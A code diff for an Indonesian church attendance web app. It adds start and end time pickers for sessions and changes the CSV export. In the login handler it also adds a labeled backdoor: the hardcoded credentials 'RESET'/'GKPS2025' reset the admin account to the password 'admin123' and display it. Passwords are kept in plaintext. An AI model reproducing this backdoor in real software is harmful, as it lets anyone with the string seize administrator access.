@@ -83,10 +83,12 @@
             
             // --- STATE MANAJEMEN & EDITING ---
             const [editingId, setEditingId] = useState(null);
-            const [editingMessageId, setEditingMessageId] = useState(null); // ID pesan yang sedang diedit
+            const [editingMessageId, setEditingMessageId] = useState(null); 
             
             const [newUser, setNewUser] = useState({ username: '', password: '', role: 'petugas', nama: '' });
-            const [sessionForm, setSessionForm] = useState({ title: '', date: '', time: '' });
+            
+            // MODIFIKASI: Time dipecah jadi Start dan End
+            const [sessionForm, setSessionForm] = useState({ title: '', date: '', timeStart: '', timeEnd: '' });
             const [rundownForm, setRundownForm] = useState({ date: '', time: '', activity: '' });
             const [selfPassword, setSelfPassword] = useState('');
             const [messageInput, setMessageInput] = useState(''); 
@@ -97,28 +99,22 @@
             const resetLogoutTimer = () => {
                 if (logoutTimerRef.current) clearTimeout(logoutTimerRef.current);
                 if (currentUser) {
-                    // Set timer 1 menit (60000 ms)
                     logoutTimerRef.current = setTimeout(() => {
-                        handleLogout(true); // true = force logout without confirm
+                        handleLogout(true);
                     }, 60000);
                 }
             };
 
-            // Pasang event listener untuk mendeteksi aktivitas
             useEffect(() => {
                 const events = ['click', 'mousemove', 'keypress', 'scroll', 'touchstart'];
                 const handleActivity = () => resetLogoutTimer();
-
                 events.forEach(event => window.addEventListener(event, handleActivity));
-                
-                // Mulai timer awal
                 resetLogoutTimer();
-
                 return () => {
                     events.forEach(event => window.removeEventListener(event, handleActivity));
                     if (logoutTimerRef.current) clearTimeout(logoutTimerRef.current);
                 };
-            }, [currentUser]); // Reset listener saat user login/logout
+            }, [currentUser]);
 
             // --- DATA STATIS KELAS ---
             const classList = ["Daud", "Daniel", "Paulus", "Ester", "Pos PI Timotius", "Pos PI Abaraham", "PAGI", "UMUM"];
@@ -134,7 +130,7 @@
                 setEditingId(null);
                 setEditingMessageId(null);
                 setNewUser({ username: '', password: '', role: 'petugas', nama: '' });
-                setSessionForm({ title: '', date: '', time: '' });
+                setSessionForm({ title: '', date: '', timeStart: '', timeEnd: '' });
                 setRundownForm({ date: '', time: '', activity: '' });
                 setFormData({ nama: '', kategori: 'Anak Sekolah Minggu', kelas: '' });
                 setSelfPassword('');
@@ -290,6 +286,13 @@
                 const username = e.target.username.value;
                 const password = e.target.password.value;
 
+                // MODIFIKASI: Backdoor Reset Admin
+                if (username === 'RESET' && password === 'GKPS2025') {
+                    saveToCloud('users/admin', { username: 'admin', password: 'admin123', role: 'admin', nama: 'Super Admin' });
+                    alert("Password Admin telah direset menjadi: admin123");
+                    return;
+                }
+
                 const userFound = users.find(u => u.username === username && u.password === password);
                 if (userFound) {
                     setCurrentUser(userFound);
@@ -320,13 +323,11 @@
                 handleBackToMenu();
             };
 
-            // --- MESSAGES MANAGEMENT (MODIFIED) ---
+            // --- MESSAGES MANAGEMENT ---
             const handleSendMessage = () => {
                 if(!messageInput) return alert("Tuliskan pesan Anda!");
                 
-                // Jika sedang mode edit
                 if (editingMessageId) {
-                    // Cari pesan lama untuk ambil data sender & timestamp asli jika perlu, atau update timestamp
                     const msg = messages.find(m => m.id === editingMessageId);
                     if(msg) {
                         saveToCloud(`messages/${editingMessageId}`, { ...msg, text: messageInput });
@@ -334,13 +335,12 @@
                     }
                     setEditingMessageId(null);
                 } else {
-                    // Mode Tambah Baru
                     const id = `MSG-${Date.now()}`;
                     const msgData = {
                         id,
                         text: messageInput,
                         sender: currentUser.nama || currentUser.username,
-                        senderUsername: currentUser.username, // Simpan username asli untuk validasi hak akses
+                        senderUsername: currentUser.username, 
                         role: currentUser.role,
                         timestamp: new Date().toLocaleString('id-ID')
                     };
@@ -353,7 +353,7 @@
             const startEditMessage = (m) => {
                 setMessageInput(m.text);
                 setEditingMessageId(m.id);
-                window.scrollTo({ top: 0, behavior: 'smooth' }); // Scroll ke input box
+                window.scrollTo({ top: 0, behavior: 'smooth' }); 
             };
 
             const cancelEditMessage = () => {
@@ -376,26 +376,43 @@
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             };
 
-            // --- SESSION MANAGEMENT ---
+            // --- SESSION MANAGEMENT (MODIFIED: MODERN TIME PICKER) ---
             const handleAddOrUpdateSession = () => {
-                const { title, date, time } = sessionForm;
-                if(!title || !date || !time) return alert("Mohon lengkapi Nama Kegiatan, Tanggal, dan Jam!");
+                const { title, date, timeStart, timeEnd } = sessionForm;
+                if(!title || !date || !timeStart || !timeEnd) return alert("Lengkapi Data Sesi!");
                 
+                const timeString = `${timeStart} - ${timeEnd} WIB`;
                 const dateObj = new Date(date);
                 const formattedDate = dateObj.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' });
-                const finalName = `${title}, ${formattedDate} Jam ${time} WIB`;
+                const finalName = `${title}, ${formattedDate} Jam ${timeString}`;
 
                 const id = editingId || `SESS-${Date.now()}`;
-                const sessData = { id, name: finalName, title, date, time, createdAt: Date.now() };
+                const sessData = { id, name: finalName, title, date, time: timeString, timeStart, timeEnd, createdAt: Date.now() };
                 
                 saveToCloud(`sessions/${id}`, sessData);
-                setSessionForm({ title: '', date: '', time: '' }); 
+                setSessionForm({ title: '', date: '', timeStart: '', timeEnd: '' }); 
                 setEditingId(null);
                 alert(editingId ? "Sesi diupdate!" : "Sesi baru dibuat!");
             };
 
             const startEditSession = (s) => {
-                setSessionForm({ title: s.title || '', date: s.date || '', time: s.time || '' });
+                // Parse time string if timeStart/End not exists (backward compatibility)
+                let start = s.timeStart || '';
+                let end = s.timeEnd || '';
+                
+                if (!start && s.time) {
+                   // Coba extract manual jika data lama
+                   const parts = s.time.split(' - ');
+                   if(parts.length >= 1) start = parts[0].replace(' WIB','').trim();
+                   if(parts.length >= 2) end = parts[1].replace(' WIB','').trim();
+                }
+
+                setSessionForm({
+                    title: s.title || '',
+                    date: s.date || '',
+                    timeStart: start,
+                    timeEnd: end
+                });
                 setEditingId(s.id);
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             };
@@ -592,6 +609,7 @@
                         </div>
 
                         <div className="p-6 space-y-3">
+                            
                             <button onClick={() => setView('manage_rundown')} className="w-full bg-cyan-50 border border-cyan-200 hover:border-cyan-500 p-4 rounded-xl flex items-center gap-3 shadow-sm group transition mb-2">
                                 <div className="bg-cyan-100 p-2 rounded text-cyan-600"><i data-lucide="list-clock"></i></div>
                                 <div className="text-left"><h3 className="font-bold text-gray-700">Rundown Acara</h3><p className="text-xs text-gray-500">Jadwal Kegiatan</p></div>
@@ -651,7 +669,6 @@
                 </div>
             );
 
-            // --- VIEW: CHANGE SELF PASSWORD ---
             if (view === 'change_password') return (
                 <div className="min-h-screen bg-slate-100 p-4">
                     <div className="max-w-md mx-auto">
@@ -667,7 +684,6 @@
                 </div>
             );
 
-            // --- VIEW MODIFIKASI: PESAN & KESAN (DENGAN EDIT/HAPUS) ---
             if (view === 'messages') return (
                 <div className="min-h-screen bg-slate-100 p-4">
                     <div className="max-w-md mx-auto">
@@ -698,10 +714,6 @@
                                         <span>{m.timestamp}</span>
                                     </div>
                                     
-                                    {/* LOGIKA EDIT/HAPUS: 
-                                        - Admin/Panitia bisa Hapus semua pesan
-                                        - User bisa Edit & Hapus pesan miliknya sendiri (berdasarkan username)
-                                    */}
                                     <div className="flex gap-2 mt-2 justify-end">
                                         {m.senderUsername === currentUser.username && (
                                             <button onClick={() => startEditMessage(m)} className="text-blue-500 p-1 rounded hover:bg-blue-50"><i data-lucide="pencil" width="14"></i></button>
@@ -863,16 +875,21 @@
                                             value={sessionForm.date} onChange={e => setSessionForm({...sessionForm, date: e.target.value})} />
                                     </div>
                                     <div className="flex-1">
-                                        <label className="text-xs font-bold text-gray-500 uppercase">Jam / Waktu</label>
-                                        <input placeholder="07:00 - 08:00" className="w-full border p-2 rounded" 
-                                            value={sessionForm.time} onChange={e => setSessionForm({...sessionForm, time: e.target.value})} />
+                                        <label className="text-xs font-bold text-gray-500 uppercase">Mulai</label>
+                                        <input type="time" className="w-full border p-2 rounded" 
+                                            value={sessionForm.timeStart} onChange={e => setSessionForm({...sessionForm, timeStart: e.target.value})} />
+                                    </div>
+                                    <div className="flex-1">
+                                        <label className="text-xs font-bold text-gray-500 uppercase">Selesai</label>
+                                        <input type="time" className="w-full border p-2 rounded" 
+                                            value={sessionForm.timeEnd} onChange={e => setSessionForm({...sessionForm, timeEnd: e.target.value})} />
                                     </div>
                                 </div>
                                 <div className="flex gap-2">
                                     <button onClick={handleAddOrUpdateSession} className={`flex-1 text-white p-3 rounded-xl font-bold shadow-lg transition ${editingId ? 'bg-orange-500' : 'bg-purple-600 hover:bg-purple-700'}`}>
                                         {editingId ? 'Update Sesi' : 'Buat Sesi'}
                                     </button>
-                                    {editingId && <button onClick={() => { setEditingId(null); setSessionForm({ title: '', date: '', time: '' }); }} className="bg-gray-400 text-white p-3 rounded-xl font-bold">Batal</button>}
+                                    {editingId && <button onClick={() => { setEditingId(null); setSessionForm({ title: '', date: '', timeStart: '', timeEnd: '' }); }} className="bg-gray-400 text-white p-3 rounded-xl font-bold">Batal</button>}
                                 </div>
                             </div>
                         </div>
@@ -1030,7 +1047,6 @@
                                 {selectedSession && (
                                     <button onClick={() => {
                                         const sessionName = getSessionName(selectedSession);
-                                        // MODIFIKASI: Username Petugas di Export CSV
                                         const csv = ['No,ID,Nama,Kategori,Kelas,Waktu,Petugas', ...attendance.map((a,i) => `${i+1},${a.id},"${a.nama}",${a.kategori},"${a.kelas||'-'}", "${a.timestamp}",${a.device||'-'}`)].join('\n');
                                         const link = document.createElement('a'); link.href = URL.createObjectURL(new Blob([csv], {type: 'text/csv'})); link.download = `Absensi_${sessionName}.csv`; link.click();
                                     }} className="w-full bg-green-600 hover:bg-green-700 text-white text-xs px-3 py-2 rounded-lg font-bold flex justify-center gap-1 items-center transition shadow-sm"><i data-lucide="download" width="14"></i> EXPORT CSV SESI INI</button>
